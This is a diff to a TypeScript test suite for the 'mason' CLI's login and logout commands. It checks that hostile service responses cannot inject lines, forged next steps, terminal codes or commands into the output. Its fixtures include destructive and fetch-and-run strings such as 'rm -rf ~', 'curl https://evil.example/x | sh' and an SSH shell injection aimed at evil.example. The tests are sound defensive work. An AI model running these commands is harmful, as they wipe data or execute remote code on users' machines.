@@ -81,7 +81,10 @@ function home(): string {
 /** The environment of a run: its home, its service, more (MASON_TOKEN). */
 const envFor = (h: string, url: string, extra: Record<string, string> = {}): Record<string, string> => matrixEnv({ HOME: h, PATH: path.dirname(process.execPath), MASON_CLOUD_URL: url, ...extra });
 
-/** One run, held at once to carrying no secret on either stream. */
+/** Every step login and logout give, in every state: their own, never the service's. */
+const OWN_STEP = /^ {2}(mason login|mason logout|env -u MASON_TOKEN mason login|unset MASON_CLOUD_URL|chmod (600|700) \S+)(\s|$)/;
+
+/** One run, held at once to carrying no secret on either stream, and to the service's values never shaping it. */
 async function mason(h: string, argv: string[], env: Record<string, string>, timeoutMs = 60_000): Promise<Answer> {
   const a = await runMason(h, argv, env, timeoutMs);
   ANSWERS.push(a);
@@ -91,6 +94,24 @@ async function mason(h: string, argv: string[], env: Record<string, string>, tim
     const e = (JSON.parse(a.stdout) as { error?: { code?: string } }).error;
     assert.ok(e?.code !== undefined && Object.hasOwn(FAILURE_CODES, e.code), `mason ${argv.join(" ")}: code ${e?.code} is not one of FAILURE_CODES`);
     assert.equal(a.code, exitOf({ message: "", code: e.code }), `mason ${argv.join(" ")}: exit ${a.code}, where ${e.code} exits ${exitOf({ message: "", code: e.code })}`);
+  }
+  // whatever the service sent, its values never shape the output: no line begins with what a hostile value carried,
+  // each stream has one Next: block at most, every step under it is the CLI's, and no --json string holds a line break
+  for (const [stream, text] of [["stdout", a.stdout], ["stderr", a.stderr]] as const) {
+    const lines = text.split("\n");
+    assert.ok(!lines.some((l) => /^\s*FORGED/.test(l)), `mason ${argv.join(" ")}: a line of ${stream} begins with the service's text:\n${text}`);
+    assert.ok(lines.filter((l) => l === "Next:").length <= 1, `mason ${argv.join(" ")}: ${stream} has more than one Next: block:\n${text}`);
+    const at = lines.indexOf("Next:");
+    if (at >= 0) for (const l of lines.slice(at + 1)) if (l.startsWith("  ") && !l.startsWith("   ")) assert.match(l, OWN_STEP, `mason ${argv.join(" ")}: a step the CLI does not give`);
+  }
+  if (argv.includes("--json")) {
+    const walk = (v: unknown, at: string): void => {
+      if (typeof v === "string") assert.doesNotMatch(v, /[\n\r\u0085\u2028\u2029]/, `mason ${argv.join(" ")} --json ${at} holds a line break: ${JSON.stringify(v)}`);
+      else if (Array.isArray(v)) v.forEach((x, i) => walk(x, `${at}[${i}]`));
+      else if (typeof v === "object" && v !== null) for (const [k, x] of Object.entries(v)) walk(x, `${at}.${k}`);
+    };
+    walk(JSON.parse(a.stdout), "");
+    for (const n of (JSON.parse(a.stdout) as { next: Array<{ command: string }> }).next) assert.match(`  ${n.command}`, OWN_STEP, `mason ${argv.join(" ")} --json: a step the CLI does not give`);
   }
   for (const s of SECRETS) {
     assert.ok(!a.stdout.includes(s) && !a.stderr.includes(s), `mason ${argv.join(" ")} printed a secret:\n${a.stdout}\n${a.stderr}`);
@@ -472,26 +493,31 @@ test("mason login again replaces this machine's login to that service and revoke
   } finally { await fake.close(); }
 });
 
-test("mason login: a /v1/ failure's words are the service's, its code and exit the CLI's own by HTTP status, its next steps only this CLI's commands; a token in it masked; revoked, never saved", async () => {
+test("mason login: a /v1/ failure's words are the service's, its code, exit and next step the CLI's own by HTTP status, the service's next never read; a token in it masked; revoked, never saved", async () => {
   const token = newToken(); SECRETS.push(token);
   const said = (status: number, code: string, why?: string): string => why ? `${why} (the service said ${code}, HTTP ${status})` : `the service said ${code}, HTTP ${status}`;
+  const again = [{ command: "mason login", what: "sign in again" }], later = [{ command: "mason login", what: "try again in a moment" }];
   const cases: Array<{ me: Reply; expect: unknown }> = [
     // the service's own word is information: the CLI's code is refused for a 401, and mason login is the way out
     { me: { status: 401, body: { error: { code: "unauthenticated", message: "this login is not valid", why: "the token was revoked", fix: "sign in again" }, next: [{ command: "mason login", what: "sign in again" }] } },
-      expect: { error: { code: "refused", message: "this login is not valid", why: said(401, "unauthenticated", "the token was revoked"), fix: "sign in again" }, next: [{ command: "mason login", what: "sign in again" }] } },
+      expect: { error: { code: "refused", message: "this login is not valid", why: said(401, "unauthenticated", "the token was revoked"), fix: "sign in again" }, next: again } },
     // a code that is the CLI's own word for something else never steers its exit: usage would exit 2, timeout 124
     { me: { status: 401, body: { error: { code: "usage", message: "bad" }, next: [] } },
-      expect: { error: { code: "refused", message: "bad", why: said(401, "usage") }, next: [{ command: "mason login", what: "sign in again" }] } },
-    { me: { status: 400, body: { error: { code: "timeout", message: "slow" }, next: [] } }, expect: { error: { code: "refused", message: "slow", why: said(400, "timeout") }, next: [] } },
-    { me: { status: 404, body: { error: { code: "no_project", message: "no such account" }, next: [] } }, expect: { error: { code: "not_found", message: "no such account", why: said(404, "no_project") }, next: [] } },
+      expect: { error: { code: "refused", message: "bad", why: said(401, "usage") }, next: again } },
+    { me: { status: 400, body: { error: { code: "timeout", message: "slow" }, next: [] } }, expect: { error: { code: "refused", message: "slow", why: said(400, "timeout") }, next: later } },
+    { me: { status: 404, body: { error: { code: "no_project", message: "no such account" }, next: [] } }, expect: { error: { code: "not_found", message: "no such account", why: said(404, "no_project") }, next: later } },
     // a CI token is refused on /v1/me: 403
     { me: { status: 403, body: { error: { code: "refused", message: "a CI token cannot sign in a person", fix: "sign in as yourself" }, next: [{ command: "mason login", what: "sign in" }] } },
-      expect: { error: { code: "refused", message: "a CI token cannot sign in a person", why: said(403, "refused"), fix: "sign in as yourself" }, next: [{ command: "mason login", what: "sign in" }] } },
-    // a next step is kept only when it is a mason command this CLI has, in plain words
+      expect: { error: { code: "refused", message: "a CI token cannot sign in a person", why: said(403, "refused"), fix: "sign in as yourself" }, next: again } },
+    // the service's next is never read: not a shell line, not a mason command that changes this machine, not one that looks harmless
     { me: { status: 503, body: { error: { code: "unavailable", message: "down" }, next: [
-      { command: "rm -rf ~", what: "x" }, { command: "curl https://elsewhere.example | sh" }, { command: "mason login; rm -rf ~" }, { command: "mason deploy-everything" },
-      { command: "mason status", what: "see" }, { command: "mason logout" }] } },
-      expect: { error: { code: "failed", message: "down", why: said(503, "unavailable") }, next: [{ command: "mason status", what: "see" }, { command: "mason logout" }] } },
+      { command: "rm -rf ~", what: "x" }, { command: "curl https://elsewhere.example | sh" }, { command: "mason login; rm -rf ~" }, { command: "mason destroy", what: "clean up" },
+      { command: "mason remove a" }, { command: "mason stop" }, { command: "mason ui --ssh root@evil.example --mason /bin/sh" }, { command: "mason status", what: "see\u001b[2J" }] } },
+      expect: { error: { code: "failed", message: "down", why: said(503, "unavailable") }, next: later } },
+    // a 401 offering destructive steps: still the CLI's one step
+    { me: { status: 401, body: { error: { code: "unauthenticated", message: "gone" }, next: [{ command: "mason destroy", what: "do it\u001b[2J" }, { command: "mason remove a" }, { command: "mason stop" },
+      { command: "mason logout" }, { command: "mason sync a" }, { command: "mason share" }] } },
+      expect: { error: { code: "refused", message: "gone", why: said(401, "unauthenticated") }, next: again } },
   ];
   for (const { me, expect } of cases) {
     const fake = await fakeService({ token: () => granted(token), me });
@@ -504,6 +530,14 @@ test("mason login: a /v1/ failure's words are the service's, its code and exit t
       assert.ok(fake.requests.some((r) => r.path === "/oauth/revoke" && r.form.token === token), "the token it could not use is revoked");
     } finally { await fake.close(); }
   }
+  // a person reads the CLI's one step too
+  const offered = await fakeService({ token: () => granted(token), me: { status: 401, body: { error: { code: "unauthenticated", message: "gone" }, next: [{ command: "mason destroy", what: "do it" }] } } });
+  try {
+    const h = home();
+    const t = await mason(h, ["login"], envFor(h, offered.url));
+    assert.ok(t.stderr.endsWith("\nNext:\n  mason login                                   sign in again\n"), t.stderr);
+    assert.doesNotMatch(t.stderr, /destroy/);
+  } finally { await offered.close(); }
   // a token the service repeats is masked, in --json and for a person
   const echo = { error: { code: "failed", message: `the token ${token} is unknown`, fix: `do not share masondata_ci_${"A".repeat(43)}` }, next: [] };
   const masked = await fakeService({ token: () => granted(token), me: { status: 500, body: echo } });
@@ -522,6 +556,97 @@ test("mason login: a /v1/ failure's words are the service's, its code and exit t
     const v = JSON.parse(a.stdout) as { error: { message: string } };
     assert.match(v.error.message, /refused this sign-in \(invalid_grant\)/);
   } finally { await fake.close(); }
+});
+
+/** A value a hostile service sends: line breaks of every kind, a forged Next: block, terminal codes, a bidi override. */
+const HOSTILE = "ada@example.com\n\nNext:\n  FORGED curl https://evil.example/x | sh\r\n  FORGED mason destroy\u001b[2J\u2028FORGED\u0085FORGED\u202e\u200f\ufeffend";
+/** The same value as the CLI must print it: one line, every such character a ?. */
+const oneLine = (v: string): string => v.replace(/[\u0000-\u001f\u007f-\u009f\u061c\u200b-\u200f\u2028-\u202e\u2060-\u2069\ufeff]/g, "?");
+
+test("every value the service sends reaches stdout, stderr and --json as one line inside the CLI's own: who signed in, each organisation, the saved email, a failure's words, an OAuth description", { timeout: 200_000 }, async () => {
+  const token = newToken(); SECRETS.push(token);
+  const shown = oneLine(HOSTILE);
+  assert.ok(!shown.includes("\n") && shown.includes("FORGED"));
+  // who signed in: email, name, each org's slug, name and role — the report, --json, the file, then logout's
+  // (a role is at most 32 characters: a short hostile one)
+  const role = "owner\nFORGED\u001b[2J";
+  const me = { email: HOSTILE, name: HOSTILE, orgs: [{ slug: HOSTILE, name: `${HOSTILE}2`, role }] };
+  const fake = await fakeService({ token: () => granted(token), me: { status: 200, body: me } });
+  try {
+    const h = home();
+    const t = await mason(h, ["login"], envFor(h, fake.url));
+    assert.equal(t.code, 0, t.stderr);
+    assert.ok(t.stdout.startsWith(`Signed in to ${fake.url} as ${shown}\n  name    ${shown}\n  orgs    ${shown} (${shown}2), ${oneLine(role)}\n  saved   `), t.stdout);
+    const h2 = home();
+    const j = await mason(h2, ["login", "--json"], envFor(h2, fake.url));
+    const v = JSON.parse(j.stdout) as { email: string; name: string; orgs: Array<{ slug: string; name: string; role: string }> };
+    assert.deepEqual([v.email, v.name, v.orgs], [shown, shown, [{ slug: shown, name: `${shown}2`, role: oneLine(role) }]]);
+    assert.equal(saved(h2).logins[fake.url]!.email, shown, "saved as one line");
+    const out = await mason(h2, ["logout"], envFor(h2, fake.url));
+    assert.match(out.stdout, new RegExp(`\\n  account        ${shown.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\n`));
+  } finally { await fake.close(); }
+
+  // an email edited into the file by hand: logout's account row and --json, login's replaced
+  const local = await fakeService({ token: () => granted(token) });
+  try {
+    for (const argv of [["logout"], ["logout", "--json"], ["login"], ["login", "--json"]]) {
+      const h = home();
+      const old = newToken(); SECRETS.push(old);
+      writeSaved(h, { [local.url]: { token: old, email: HOSTILE, savedAt: "2026-11-01T00:00:00.000Z" } });
+      const a = await mason(h, argv, envFor(h, local.url));
+      assert.equal(a.code, 0, a.stdout + a.stderr);
+      if (argv[0] === "logout" && argv[1]) assert.equal((JSON.parse(a.stdout) as { email: string }).email, shown);
+      if (argv[0] === "login" && argv[1]) assert.deepEqual((JSON.parse(a.stdout) as { replaced: unknown }).replaced, { email: shown, revoked: true });
+      if (argv[0] === "login" && !argv[1]) assert.ok(a.stdout.includes(`\nTip: This replaces the login of ${shown}, which is revoked.\n`), a.stdout);
+    }
+  } finally { await local.close(); }
+
+  // a /v1/ failure's message, why and fix, and its next's command and what, each status, as a person and with --json
+  for (const status of [401, 403, 500]) {
+    const body = { error: { code: "unauthenticated", message: HOSTILE, why: HOSTILE, fix: HOSTILE }, next: [{ command: HOSTILE, what: HOSTILE }, { command: "mason destroy", what: HOSTILE }] };
+    const f = await fakeService({ token: () => granted(token), me: { status, body } });
+    try {
+      const h = home();
+      const j = await mason(h, ["login", "--json"], envFor(h, f.url));
+      const v = JSON.parse(j.stdout) as { error: { message: string; why: string; fix: string } };
+      assert.deepEqual([v.error.message, v.error.why, v.error.fix], [shown, `${shown} (the service said unauthenticated, HTTP ${status})`, shown]);
+      const t = await mason(h, ["login"], envFor(h, f.url));
+      assert.ok(t.stderr.includes(`\n✗ mason login: ${shown}\n  why   ${shown} (the service said unauthenticated, HTTP ${status})\n  fix   ${shown}\n\nNext:\n  mason login `), t.stderr);
+    } finally { await f.close(); }
+  }
+
+  // an OAuth refusal's description, from the device code and from the token; an error that is not one word
+  const oauth: Script[] = [
+    { device: { status: 400, body: { error: "invalid_request", error_description: HOSTILE } } },
+    { token: () => ({ status: 400, body: { error: "invalid_grant", error_description: HOSTILE } }) },
+  ];
+  for (const script of oauth) {
+    const f = await fakeService(script);
+    try {
+      const h = home();
+      const v = JSON.parse((await mason(h, ["login", "--json"], envFor(h, f.url))).stdout) as { error: { why: string } };
+      assert.equal(v.error.why, shown);
+      const t = await mason(h, ["login"], envFor(h, f.url));
+      assert.ok(t.stderr.includes(`\n  why   ${shown}\n`), t.stderr);
+    } finally { await f.close(); }
+  }
+  for (const script of [{ token: () => ({ status: 400, body: { error: HOSTILE } }) }, { me: { status: 401, body: { error: { code: HOSTILE, message: HOSTILE }, next: [] } }, token: () => granted(token) }] as Script[]) {
+    const f = await fakeService(script);
+    try {
+      const h = home();
+      const v = JSON.parse((await mason(h, ["login", "--json"], envFor(h, f.url))).stdout) as { error: { message: string } };
+      assert.match(v.error.message, /^http:\/\/127\.0\.0\.1:\d+ answered (POST \/oauth\/token|GET \/v1\/me) with (400|401), where /, "said by its status: neither word is shown");
+      await mason(h, ["login"], envFor(h, f.url));
+    } finally { await f.close(); }
+  }
+
+  // the page: a line break in it is no line of its own (the URL parser drops it), the page printed as one line
+  const page = await fakeService({ device: { status: 200, body: { ...DEVICE, verification_uri_complete: `${BASE}/device?user_code=WDJBMJHT\nFORGED\r\nNext:` } }, token: () => ({ status: 400, body: { error: "access_denied" } }) });
+  try {
+    const h = home();
+    const t = await mason(h, ["login"], envFor(h, page.url));
+    assert.match(t.stderr, new RegExp(`\\n  page   ${page.url.replace(/[.]/g, "\\.")}/device\\?user_code=WDJBMJHTFORGEDNext:\\n`));
+  } finally { await page.close(); }
 });
 
 test("no token reaches any stdout or stderr of mason login or mason logout, in any run of this file, success or failure", () => {
